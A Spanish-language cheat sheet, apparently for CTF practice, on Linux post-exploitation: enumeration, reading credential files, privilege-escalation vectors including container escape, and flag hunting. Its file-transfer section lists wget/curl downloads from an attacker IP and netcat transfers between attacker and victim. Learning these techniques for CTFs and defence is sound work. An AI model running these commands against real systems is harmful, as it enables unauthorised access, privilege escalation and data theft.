# Post-explotacion_Linux

---

Post‑explotación en Linux

Cuando obtienes una shell en un sistema Linux (por ejemplo, con una reverse shell o una web shell), necesitas enumerar el sistema para encontrar la flag, escalar privilegios o moverte lateralmente. Estos comandos son el "kit de supervivencia".
Enumeración básica del sistema
Comando	Qué descubre
id	Usuario actual, grupos, contexto SELinux/AppArmor
whoami	Nombre de usuario
uname -a	Kernel, arquitectura, nombre del host
hostname	Nombre de la máquina
cat /etc/os-release	Distribución y versión
cat /etc/passwd	Lista de usuarios del sistema
cat /etc/shadow	Hashes de contraseñas (solo root)
env o set	Variables de entorno (rutas, credenciales a veces)
history	Historial de comandos del usuario actual
pwd	Directorio actual
Enumeración de procesos y servicios
Comando	Propósito
ps aux	Todos los procesos con sus comandos
ps auxf	Árbol de procesos (jerarquía)
netstat -tulpn	Puertos escuchando y conexiones activas
ss -tulpn	Similar a netstat, más moderno
lsof -i	Archivos abiertos relacionados con red
systemctl list-units --type=service	Servicios systemd (privilegios)
Enumeración de archivos y permisos
Comando	Uso
find / -perm -4000 -type f 2>/dev/null	Binarios SUID (escalada de privilegios)
find / -perm -2000 -type f 2>/dev/null	Binarios SGID
find / -writable -type d 2>/dev/null	Directorios escribibles por el usuario
find / -user root -perm -4000 -exec ls -ldb {} \;	SUID root
sudo -l	Comandos que el usuario puede ejecutar con sudo (sin contraseña)
cat /etc/sudoers	Archivo sudoers (solo root)
crontab -l	Tareas cron del usuario
ls -la /etc/cron*	Cron del sistema
Escalada de privilegios – vectores comunes
Vector	Comandos a probar
SUID binarios	find / -perm -4000 2>/dev/null luego buscar en GTFOBins (https://gtfobins.github.io/)
Sudo sin contraseña	sudo -l; si hay sudo /bin/bash o sudo /usr/bin/vi, se puede escalar fácilmente
Capabilities	getcap -r / 2>/dev/null (ej. cap_dac_read_search permite leer cualquier archivo)
Cron jobs mal escritos	Revisar scripts en /etc/cron* que sean modificables
Kernel exploits	uname -a → buscar exploit en searchsploit o exploit-db
Docker / LXC	Si estás dentro de un contenedor, escapar con docker run -v /:/host ...
Servicios internos	netstat -tulpn y conectar a puertos internos (Redis, MySQL, etc.) con credenciales por defecto
Encontrar la flag (objetivo típico)
bash

find / -name "*flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -i "picoCTF"
grep -r "picoCTF" /home/ 2>/dev/null
cat /root/flag.txt

Transferencia de archivos (para sacar evidencia o subir herramientas)
bash

# Descargar archivo desde tu máquina atacante
wget http://tu_ip/linpeas.sh
curl http://tu_ip/linpeas.sh -o linpeas.sh

# Subir archivo a tu máquina
nc -lvp 4444 < archivo_local          # atacante
nc tu_ip 4444 > archivo               # víctima

# Con Python HTTP server
python3 -m http.server 8000           # atacante
wget http://tu_ip:8000/script.sh      # víctima

¿Por qué es útil en hacking?

    Sin post‑explotación, no encuentras la flag. La shell inicial suele ser de un usuario poco privilegiado.

    La enumeración metódica (comprobar SUID, sudo, cron, procesos) es la única forma de escalar a root o a otros usuarios.

    Conocer comandos alternativos (ss en lugar de netstat, ps auxf frente a ps -ef) te salva en entornos limitados

